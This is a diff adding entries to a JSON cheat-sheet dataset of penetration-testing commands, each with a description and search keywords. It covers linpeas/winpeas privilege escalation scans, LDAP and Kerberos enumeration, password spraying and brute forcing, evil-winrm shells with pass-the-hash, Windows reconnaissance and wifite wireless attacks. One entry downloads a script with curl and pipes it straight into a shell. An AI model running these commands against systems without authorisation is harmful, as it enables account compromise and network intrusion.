@@ -6191,5 +6191,255 @@
       "dig dmarc lookup",
       "find dmarc configuration"
     ]
+  },
+  {
+    "tool": "linpeas.sh",
+    "command": "./linpeas.sh",
+    "desc": "runs a full automated privilege escalation enumeration on a linux machine, checking suid files, cron jobs, weak permissions, and more",
+    "keywords": [
+      "automated linux privesc scan",
+      "linpeas full scan",
+      "run linpeas",
+      "linux privilege escalation enumeration"
+    ]
+  },
+  {
+    "tool": "linpeas.sh",
+    "command": "./linpeas.sh | tee linpeas_output.txt",
+    "desc": "runs linpeas and saves the full output to a file while still showing it on screen",
+    "keywords": [
+      "save linpeas output",
+      "linpeas output to file",
+      "log linpeas results"
+    ]
+  },
+  {
+    "tool": "linpeas.sh",
+    "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "desc": "downloads and runs linpeas directly in memory without saving the script to disk",
+    "keywords": [
+      "run linpeas without downloading",
+      "fileless linpeas",
+      "linpeas one liner",
+      "download and run linpeas"
+    ]
+  },
+  {
+    "tool": "winpeas.exe",
+    "command": "winPEASx64.exe",
+    "desc": "runs a full automated privilege escalation enumeration on a 64-bit windows machine",
+    "keywords": [
+      "automated windows privesc scan",
+      "winpeas full scan",
+      "run winpeas",
+      "windows privilege escalation enumeration"
+    ]
+  },
+  {
+    "tool": "winpeas.exe",
+    "command": "winPEASx64.exe quiet cmd fast",
+    "desc": "runs winpeas in a faster, less verbose mode, skipping some of the slower checks",
+    "keywords": [
+      "fast winpeas scan",
+      "quiet winpeas mode",
+      "quick windows privesc check"
+    ]
+  },
+  {
+    "tool": "winpeas.exe",
+    "command": "winPEASx64.exe > winpeas_output.txt",
+    "desc": "runs winpeas and saves the full output to a file",
+    "keywords": [
+      "save winpeas output",
+      "winpeas output to file",
+      "log winpeas results"
+    ]
+  },
+  {
+    "tool": "ldapsearch",
+    "command": "ldapsearch -x -H ldap://<target-ip> -b \"dc=<domain>,dc=<tld>\"",
+    "desc": "performs an anonymous ldap query against a domain controller to enumerate directory objects",
+    "keywords": [
+      "anonymous ldap enumeration",
+      "ldapsearch anonymous bind",
+      "enumerate active directory ldap",
+      "unauthenticated ldap query"
+    ]
+  },
+  {
+    "tool": "ldapsearch",
+    "command": "ldapsearch -x -H ldap://<target-ip> -D \"<username>@<domain>\" -w <password> -b \"dc=<domain>,dc=<tld>\"",
+    "desc": "performs an authenticated ldap query against a domain controller using valid credentials",
+    "keywords": [
+      "authenticated ldap enumeration",
+      "ldapsearch with credentials",
+      "ldap bind with username password"
+    ]
+  },
+  {
+    "tool": "kerbrute",
+    "command": "kerbrute userenum -d <domain> --dc <dc-ip> <userlist-file>",
+    "desc": "enumerates valid domain usernames by abusing kerberos pre-authentication responses, without triggering account lockouts",
+    "keywords": [
+      "kerberos user enumeration",
+      "kerbrute userenum",
+      "find valid ad usernames",
+      "enumerate domain users kerberos"
+    ]
+  },
+  {
+    "tool": "kerbrute",
+    "command": "kerbrute passwordspray -d <domain> --dc <dc-ip> <userlist-file> <password>",
+    "desc": "tries a single password against a list of usernames, a technique that avoids account lockout thresholds",
+    "keywords": [
+      "password spraying attack",
+      "kerbrute passwordspray",
+      "spray single password multiple users"
+    ]
+  },
+  {
+    "tool": "kerbrute",
+    "command": "kerbrute bruteuser -d <domain> --dc <dc-ip> <wordlist-file> <username>",
+    "desc": "brute forces the password for a single known username using a wordlist",
+    "keywords": [
+      "kerbrute brute force single user",
+      "brute force one account",
+      "kerberos password brute force"
+    ]
+  },
+  {
+    "tool": "evil-winrm",
+    "command": "evil-winrm -i <target-ip> -u <username> -p <password>",
+    "desc": "opens an interactive powershell shell on a windows target over winrm using a username and password",
+    "keywords": [
+      "evil-winrm shell",
+      "get powershell shell winrm",
+      "remote windows shell credentials",
+      "winrm login"
+    ]
+  },
+  {
+    "tool": "evil-winrm",
+    "command": "evil-winrm -i <target-ip> -u <username> -H <ntlm-hash>",
+    "desc": "opens a powershell shell on a windows target using pass-the-hash instead of a plaintext password",
+    "keywords": [
+      "pass the hash winrm",
+      "evil-winrm ntlm hash",
+      "pass-the-hash attack",
+      "login with hash winrm"
+    ]
+  },
+  {
+    "tool": "evil-winrm",
+    "command": "evil-winrm -i <target-ip> -u <username> -p <password> -s <local-scripts-dir>",
+    "desc": "opens a winrm shell and loads powershell scripts from a local directory into the session for use",
+    "keywords": [
+      "load scripts evil-winrm",
+      "upload powershell scripts winrm",
+      "evil-winrm scripts folder"
+    ]
+  },
+  {
+    "tool": "net",
+    "command": "net user",
+    "desc": "lists all local user accounts on a windows machine",
+    "keywords": [
+      "list windows local users",
+      "net user command",
+      "enumerate windows accounts"
+    ]
+  },
+  {
+    "tool": "net",
+    "command": "net user <username>",
+    "desc": "shows detailed information about a specific windows user account",
+    "keywords": [
+      "view windows user details",
+      "net user specific account",
+      "check user privileges windows"
+    ]
+  },
+  {
+    "tool": "net",
+    "command": "net group",
+    "desc": "lists all local groups on a windows machine",
+    "keywords": [
+      "list windows local groups",
+      "net group command",
+      "enumerate windows groups"
+    ]
+  },
+  {
+    "tool": "net",
+    "command": "net group \"Domain Admins\" /domain",
+    "desc": "lists the members of the domain admins group in active directory",
+    "keywords": [
+      "list domain admins",
+      "find domain admin accounts",
+      "net group domain admins"
+    ]
+  },
+  {
+    "tool": "whoami",
+    "command": "whoami /priv",
+    "desc": "shows the privileges assigned to the current windows user, useful for spotting privilege escalation opportunities",
+    "keywords": [
+      "check windows user privileges",
+      "whoami priv command",
+      "find privesc token privileges",
+      "windows privilege enumeration"
+    ]
+  },
+  {
+    "tool": "whoami",
+    "command": "whoami /groups",
+    "desc": "shows the groups the current windows user belongs to",
+    "keywords": [
+      "check windows user groups",
+      "whoami groups command",
+      "view group membership windows"
+    ]
+  },
+  {
+    "tool": "systeminfo",
+    "command": "systeminfo",
+    "desc": "shows detailed information about a windows machine including os version, patches installed, and hardware, useful for finding kernel exploits",
+    "keywords": [
+      "windows system information",
+      "systeminfo command",
+      "check windows patches",
+      "find kernel exploit windows version"
+    ]
+  },
+  {
+    "tool": "wifite",
+    "command": "wifite",
+    "desc": "automatically scans for nearby wireless networks and attacks each one in turn (wep, wpa handshake capture, wps), without manual steps",
+    "keywords": [
+      "automated wireless attack",
+      "wifite auto attack",
+      "hands off wifi cracking",
+      "automatic wireless auditing"
+    ]
+  },
+  {
+    "tool": "wifite",
+    "command": "wifite --kill",
+    "desc": "kills processes that might interfere with wireless monitor mode before starting",
+    "keywords": [
+      "wifite kill interfering processes",
+      "fix monitor mode wifite",
+      "wifite check kill"
+    ]
+  },
+  {
+    "tool": "wifite",
+    "command": "wifite -i <interface>",
+    "desc": "runs wifite using a specific wireless interface instead of auto-selecting one",
+    "keywords": [
+      "wifite specify interface",
+      "choose wireless adapter wifite",
+      "wifite interface option"
+    ]
   }
 ]
